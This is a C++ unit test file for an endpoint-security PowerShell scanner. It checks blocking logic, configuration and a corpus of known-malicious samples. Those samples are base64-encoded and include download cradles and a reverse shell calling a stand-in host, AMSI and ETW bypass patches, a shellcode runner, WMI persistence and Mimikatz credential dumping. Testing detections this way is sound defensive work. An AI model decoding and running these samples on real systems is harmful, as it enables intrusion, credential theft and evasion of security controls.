/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * Unit coverage for deterministic PowerShellScanner contracts.
 *
 * Focus:
 *   - blocking and statistics JSON semantics
 *   - configuration and singleton health behavior
 *   - public memory/command-line heuristics with no live dependencies
 */

#include "pch.h"

#include <gtest/gtest.h>

#include <algorithm>
#include <string>
#include <vector>
#include <filesystem>
#include <iostream>
#include <map>
#include <Windows.h>

#include <nlohmann/json.hpp>

#include "../../../src/PhantomCore/Scripts/PowerShellScanner.hpp"
#include "../../../src/PhantomCore/Scripts/KernelBlockTarget.hpp"

namespace ShadowStrike::Scripts::Test {

// Task 368: AMSI scans of files the service read itself reported the service's own PID,
// and the scanner asked the kernel to block it.
TEST(KernelBlockTarget, RefusesNoOriginSystemAndOwnProcess) {
    EXPECT_FALSE(IsKernelBlockTarget(0));
    EXPECT_FALSE(IsKernelBlockTarget(4));
    EXPECT_FALSE(IsKernelBlockTarget(GetCurrentProcessId()));
    // Any other process id is a target; the guard does not check that it exists.
    EXPECT_TRUE(IsKernelBlockTarget(GetCurrentProcessId() + 4));
    EXPECT_TRUE(IsKernelBlockTarget(8));
}

namespace {

using nlohmann::json;

std::string EncodePowerShellCommand(std::string_view command) {
    std::string utf16le;
    utf16le.reserve(command.size() * 2);
    for (unsigned char ch : command) {
        utf16le.push_back(static_cast<char>(ch));
        utf16le.push_back('\0');
    }

    static constexpr char kAlphabet[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string encoded;
    encoded.reserve(((utf16le.size() + 2) / 3) * 4);

    for (size_t index = 0; index < utf16le.size(); index += 3) {
        const uint32_t b0 = static_cast<unsigned char>(utf16le[index]);
        const uint32_t b1 =
            (index + 1 < utf16le.size()) ? static_cast<unsigned char>(utf16le[index + 1]) : 0u;
        const uint32_t b2 =
            (index + 2 < utf16le.size()) ? static_cast<unsigned char>(utf16le[index + 2]) : 0u;
        const uint32_t triplet = (b0 << 16) | (b1 << 8) | b2;

        encoded.push_back(kAlphabet[(triplet >> 18) & 0x3F]);
        encoded.push_back(kAlphabet[(triplet >> 12) & 0x3F]);
        encoded.push_back((index + 1 < utf16le.size()) ? kAlphabet[(triplet >> 6) & 0x3F] : '=');
        encoded.push_back((index + 2 < utf16le.size()) ? kAlphabet[triplet & 0x3F] : '=');
    }

    return encoded;
}

}  // namespace

TEST(PowerShellScannerTest, ScanResultBlockingAndStatisticsSerializationRemainStable) {
    ScanResult benign;
    benign.status = ScanStatus::SUSPICIOUS;
    benign.riskScore = Constants::Heuristics::THRESHOLD_SUSPICIOUS;
    EXPECT_FALSE(benign.isBlocking());

    ScanResult blocking;
    blocking.status = ScanStatus::SUSPICIOUS;
    blocking.riskScore = Constants::Heuristics::THRESHOLD_BLOCK;
    EXPECT_TRUE(blocking.isBlocking());

    blocking.status = ScanStatus::MALICIOUS;
    EXPECT_TRUE(blocking.isBlocking());

    PSStatisticsSnapshot snapshot;
    snapshot.totalScans = 5;
    snapshot.maliciousDetected = 2;
    snapshot.amsiBypassesBlocked = 1;
    snapshot.averageScanTimeUs = 333;
    snapshot.cacheHits = 4;
    snapshot.cacheMisses = 6;

    const json statsJson = json::parse(snapshot.ToJson());
    EXPECT_EQ(statsJson.at("totalScans"), 5);
    EXPECT_EQ(statsJson.at("maliciousDetected"), 2);
    EXPECT_EQ(statsJson.at("cacheMisses"), 6);
}

TEST(PowerShellScannerTest, ConfigUpdatesPersistAndHealthCheckStaysHealthy) {
    auto& scanner = PowerShellScanner::getInstance();
    scanner.resetStats();

    // The scanner is a process-wide singleton: restore its configuration so the blacklist
    // entry added here does not leak into later tests.
    const PowerShellScanConfig original = scanner.getConfig();
    struct Restore {
        PowerShellScanner& s; const PowerShellScanConfig& c;
        ~Restore() { s.updateConfig(c); }
    } restore{scanner, original};

    PowerShellScanConfig config = scanner.getConfig();
    config.blockObfuscatedScripts = true;
    config.maxDeobfuscationDepth = 3;
    config.blacklistedCmdlets.push_back("Invoke-Test");
    scanner.updateConfig(config);

    const auto updated = scanner.getConfig();
    EXPECT_TRUE(updated.blockObfuscatedScripts);
    EXPECT_EQ(updated.maxDeobfuscationDepth, 3u);
    EXPECT_NE(std::find(updated.blacklistedCmdlets.begin(),
                        updated.blacklistedCmdlets.end(),
                        "Invoke-Test"),
              updated.blacklistedCmdlets.end());

    EXPECT_TRUE(scanner.healthCheck());
}

TEST(PowerShellScannerTest, EmptyMemoryAndNonPowerShellCommandLineFailClosed) {
    auto& scanner = PowerShellScanner::getInstance();
    scanner.resetStats();

    const std::string empty;
    const auto emptyResult = scanner.scanMemory(
        std::span<const char>(empty.data(), empty.size()),
        "empty",
        42);
    EXPECT_EQ(emptyResult.status, ScanStatus::CLEAN);
    EXPECT_EQ(emptyResult.mode, ExecutionMode::MEMORY_ONLY);

    const auto nonPowerShell = scanner.scanCommandLine("cmd.exe /c whoami", 42);
    EXPECT_EQ(nonPowerShell.status, ScanStatus::CLEAN);
    EXPECT_EQ(nonPowerShell.description, "Not a PowerShell command");
    EXPECT_EQ(nonPowerShell.mode, ExecutionMode::ENCODED_COMMAND_LINE);
}

TEST(PowerShellScannerTest, SuspiciousCommandLinesAndKnownMaliciousMemoryAreFlagged) {
    auto& scanner = PowerShellScanner::getInstance();
    scanner.resetStats();

    const auto downgrade = scanner.scanCommandLine(
        "powershell.exe -Version 2 -NoProfile -ExecutionPolicy Bypass",
        99);
    EXPECT_TRUE(downgrade.isBlocking());
    EXPECT_EQ(downgrade.category, ThreatCategory::V2_DOWNGRADE);
    EXPECT_GE(downgrade.riskScore, Constants::Heuristics::THRESHOLD_BLOCK);

    const std::string payload = "Invoke-Mimikatz -DumpCreds";
    const auto memoryResult = scanner.scanMemory(
        std::span<const char>(payload.data(), payload.size()),
        "memory",
        1337);
    EXPECT_TRUE(memoryResult.isBlocking());
    EXPECT_EQ(memoryResult.status, ScanStatus::MALICIOUS);
    EXPECT_FALSE(memoryResult.sha256.empty());

    const auto stats = scanner.getStats();
    EXPECT_GE(stats.totalScans, 2u);
    EXPECT_GE(stats.maliciousDetected, 1u);
}

TEST(PowerShellScannerTest, SizeLimitsAndQuotedEncodedCommandsRemainDeterministic) {
    auto& scanner = PowerShellScanner::getInstance();
    scanner.resetStats();

    const PowerShellScanConfig originalConfig = scanner.getConfig();

    const std::string benignPayload = "Write-Host 'ok'";
    PowerShellScanConfig sizedConfig = originalConfig;
    sizedConfig.maxScriptSize = static_cast<uint32_t>(benignPayload.size());
    scanner.updateConfig(sizedConfig);

    const auto exactLimit = scanner.scanMemory(
        std::span<const char>(benignPayload.data(), benignPayload.size()),
        "exact-limit",
        7);
    EXPECT_NE(exactLimit.status, ScanStatus::SKIPPED_SIZE_LIMIT);

    sizedConfig.maxScriptSize = static_cast<uint32_t>(benignPayload.size() - 1);
    scanner.updateConfig(sizedConfig);

    const auto overLimit = scanner.scanMemory(
        std::span<const char>(benignPayload.data(), benignPayload.size()),
        "over-limit",
        8);
    EXPECT_EQ(overLimit.status, ScanStatus::SKIPPED_SIZE_LIMIT);
    EXPECT_EQ(overLimit.description, "Content exceeds size limit");

    scanner.updateConfig(originalConfig);

    const std::string encodedPayload = EncodePowerShellCommand("Invoke-Mimikatz -DumpCreds");
    const auto unquoted = scanner.scanCommandLine("powershell.exe -enc " + encodedPayload, 100);
    const auto quoted =
        scanner.scanCommandLine("powershell.exe -enc \"" + encodedPayload + "\"", 101);

    EXPECT_TRUE(unquoted.isBlocking());
    EXPECT_TRUE(quoted.isBlocking());
    EXPECT_EQ(quoted.status, unquoted.status);
    EXPECT_EQ(quoted.category, unquoted.category);
}


// Every PowerShell module Windows ships on this host is benign and catalog-signed. Summing
// capabilities made 24 of 303 score as blocking, and the 1.0.124 VM run blocked reads of
// Microsoft.PowerShell.Utility.psd1 and BitLocker.psm1, which broke PowerShell (task 364).
// The one allowed exception downloads and executes by design (PowerShellGet bootstraps
// NuGet); publisher trust excuses it at the conviction stage.
TEST(PowerShellScannerCorpus, WindowsShippedModulesAreNotBlocked) {
    auto& scanner = PowerShellScanner::getInstance();
    wchar_t sys[MAX_PATH] = {};
    ASSERT_GT(::GetSystemDirectoryW(sys, MAX_PATH), 0u);
    const std::vector<std::filesystem::path> roots = {
        std::filesystem::path(sys) / L"WindowsPowerShell" / L"v1.0" / L"Modules",
        std::filesystem::path(L"C:\\Program Files\\WindowsPowerShell\\Modules")};
    size_t files = 0;
    std::vector<std::string> blocked;
    for (const auto& root : roots) {
        std::error_code ec;
        for (auto it = std::filesystem::recursive_directory_iterator(root, ec);
             !ec && it != std::filesystem::recursive_directory_iterator(); it.increment(ec)) {
            if (!it->is_regular_file()) continue;
            auto ext = it->path().extension().wstring();
            for (auto& c : ext) c = static_cast<wchar_t>(towlower(c));
            if (ext != L".ps1" && ext != L".psm1" && ext != L".psd1") continue;
            ++files;
            const auto r = scanner.scanFile(it->path(), 0);
            const bool allowed = it->path().filename() == L"PSModule.psm1" &&
                                 it->path().string().find("PowerShellGet") != std::string::npos;
            if (r.isBlocking() && !allowed) {
                std::string why;
                for (const auto& m : r.matchedRules) why += m + "; ";
                blocked.push_back(it->path().string() + " -> " + why);
            }
        }
    }
    ASSERT_GE(files, 100u) << "too few modules found for the corpus to mean anything";
    for (const auto& b : blocked) ADD_FAILURE() << b;
    const auto get = [&](const wchar_t* rel) {
        return scanner.scanFile(std::filesystem::path(sys) / L"WindowsPowerShell" / L"v1.0" / L"Modules" / rel, 0);
    };
    EXPECT_EQ(get(L"Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1").status, ScanStatus::CLEAN);
    EXPECT_EQ(get(L"BitLocker\\BitLocker.psm1").status, ScanStatus::CLEAN);
}

// Known-malicious PowerShell shapes from public tradecraft, base64-encoded so the source
// file carries no plaintext tradecraft for a host scanner to quarantine. Each must stay
// blocking: the corpus is the proof that precision work on this scanner loses no detection.
struct EncodedSample { const char* name; const char* base64; };
const EncodedSample kMaliciousSamples[] = {
    {"webclient-cradle", "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC43L2EucHMxJyk="},
    {"iwr-iex", "JGMgPSBpd3IgLVVzZUJhc2ljUGFyc2luZyBodHRwOi8vMTk4LjUxLjEwMC43L3A7IGlleCAkYy5Db250ZW50"},
    {"irm-iex", "aWV4IChpcm0gJ2h0dHBzOi8vMTk4LjUxLjEwMC43L3N0YWdlMicp"},
    {"amsi-initfailed", "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp"},
    {"amsi-split", "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi4nKydBbScrJ3NpJysnVXRpbHMnKTsgJGY9JGEuR2V0RmllbGQoJ2FtJysnc2lJbml0JysnRmFpbGVkJywnTm9uUHVibGljLFN0YXRpYycpOyAkZi5TZXRWYWx1ZSgkbnVsbCwkdHJ1ZSk="},
    {"amsi-context-null", "JHA9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUNvbnRleHQnLCdOb25QdWJsaWMsU3RhdGljJykuR2V0VmFsdWUoJG51bGwpOyBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OldyaXRlSW50MzIoJHAsMHg0MTQxNDE0MSk="},
    {"amsi-scanbuffer-patch", "JGs9QWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gJ1tEbGxJbXBvcnQoImtlcm5lbDMyIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGEsIFVJbnRQdHIgcywgdWludCBwLCBvdXQgdWludCBvKTsnIC1OYW1lIEsgLVBhc3NUaHJ1OyAkYWRkcj1bS106OkdldFByb2NBZGRyZXNzKFtLXTo6TG9hZExpYnJhcnkoJ2Ftc2kuZGxsJyksJ0Ftc2lTY2FuQnVmZmVyJyk7IFtLXTo6VmlydHVhbFByb3RlY3QoJGFkZHIsW1VJbnRQdHJdNSwweDQwLFtyZWZdMCk="},
    {"shellcode-runner", "QWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICd1c2luZyBTeXN0ZW07IHVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsgcHVibGljIGNsYXNzIFcgeyBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXSBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jKEludFB0ciBhLCB1aW50IHMsIHVpbnQgdCwgdWludCBwKTsgW0RsbEltcG9ydCgia2VybmVsMzIiKV0gcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZChJbnRQdHIgYSwgdWludCBzLCBJbnRQdHIgc3QsIEludFB0ciBwLCB1aW50IGYsIEludFB0ciBpKTsgfSc7IFtCeXRlW11dJHNjID0gMHhmYywweDQ4LDB4ODM7ICRtZW09W1ddOjpWaXJ0dWFsQWxsb2MoMCwkc2MuTGVuZ3RoLDB4MzAwMCwweDQwKTsgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRzYywwLCRtZW0sJHNjLkxlbmd0aCk7IFtXXTo6Q3JlYXRlVGhyZWFkKDAsMCwkbWVtLDAsMCwwKQ=="},
    {"credential-tool", "SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICdwcml2aWxlZ2U6OmRlYnVnIHNla3VybHNhOjpsb2dvbnBhc3N3b3Jkcyc="},
    {"gzip-b64-iex", "JHM9TmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0oLFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnSDRzSUFBQUFBQUFFQUFzSmNmVUxBUUJiRVcyVEJRQUFBQT09JykpOyBJRVggKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uR3ppcFN0cmVhbSgkcyxbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpKS5SZWFkVG9FbmQoKQ=="},
    {"reflective-assembly", "JGI9W0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRwYXlsb2FkKTsgJGFzbT1bU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRiKTsgJGFzbS5FbnRyeVBvaW50Lkludm9rZSgkbnVsbCwkbnVsbCk="},
    {"reverse-shell", "JGM9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxOTguNTEuMTAwLjcnLDQ0NDQpOyRzPSRjLkdldFN0cmVhbSgpO1tieXRlW11dJGI9MC4uNjU1MzV8JXswfTt3aGlsZSgoJGk9JHMuUmVhZCgkYiwwLCRiLkxlbmd0aCkpIC1uZSAwKXskZD0oTmV3LU9iamVjdCBUZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYiwwLCRpKTskcj0oaWV4ICRkIDI+JjF8T3V0LVN0cmluZyk7JHNiPShbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkcik7JHMuV3JpdGUoJHNiLDAsJHNiLkxlbmd0aCl9"},
    {"wmi-persistence", "JGY9U2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUFyZ3VtZW50cyBAe05hbWU9J3UnO1F1ZXJ5PSdTRUxFQ1QgKiBGUk9NIF9fSW5zdGFuY2VNb2RpZmljYXRpb25FdmVudCd9OyAkYz1TZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1Bcmd1bWVudHMgQHtOYW1lPSd1JztDb21tYW5kTGluZVRlbXBsYXRlPSdwb3dlcnNoZWxsIC1lbmMgQUFBQSd9OyBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyAtQXJndW1lbnRzIEB7RmlsdGVyPSRmO0NvbnN1bWVyPSRjfQ=="},
    {"hidden-encoded-launcher", "U3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgJy1Ob1AgLVcgSGlkZGVuIC1FbmMgU1FCRkFGZ0FJQUFvQUU0QVpRQjNBQzBBVHdCaUFHb0FaUUJqQUhRQUlBQk9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFDa0En"},
    {"hidden-encoded-opaque-payload", "U3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgJy1Ob1AgLVcgSGlkZGVuIC1FbmMgUndCbEFIUUFMUUJFQUdFQWRBQmxBQ0FBZkFBZ0FFOEFkUUIwQUMwQVRnQjFBR3dBYkFBPSc="},
    {"etw-patch", "JHA9W0tdOjpHZXRQcm9jQWRkcmVzcyhbS106OkdldE1vZHVsZUhhbmRsZSgnbnRkbGwuZGxsJyksJ0V0d0V2ZW50V3JpdGUnKTsgW0tdOjpWaXJ0dWFsUHJvdGVjdCgkcCxbVUludFB0cl0xLDB4NDAsW3JlZl0wKQ=="},
};

std::string DecodeSample(std::string_view b64) {
    static constexpr std::string_view kAlphabet =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    uint32_t buffer = 0;
    int bits = 0;
    for (const char c : b64) {
        const auto index = kAlphabet.find(c);
        if (index == std::string_view::npos) break;
        buffer = (buffer << 6) | static_cast<uint32_t>(index);
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out.push_back(static_cast<char>((buffer >> bits) & 0xFF));
        }
    }
    return out;
}

TEST(PowerShellScannerCorpus, KnownMaliciousShapesStayBlocking) {
    auto& scanner = PowerShellScanner::getInstance();
    for (const auto& sample : kMaliciousSamples) {
        const std::string text = DecodeSample(sample.base64);
        ASSERT_GT(text.size(), 20u) << sample.name;
        const auto r = scanner.scanMemory(std::span<const char>(text.data(), text.size()), sample.name, 0);
        EXPECT_TRUE(r.isBlocking()) << sample.name << " score=" << r.riskScore
                                    << " status=" << static_cast<int>(r.status);
    }
}

}  // namespace ShadowStrike::Scripts::Test
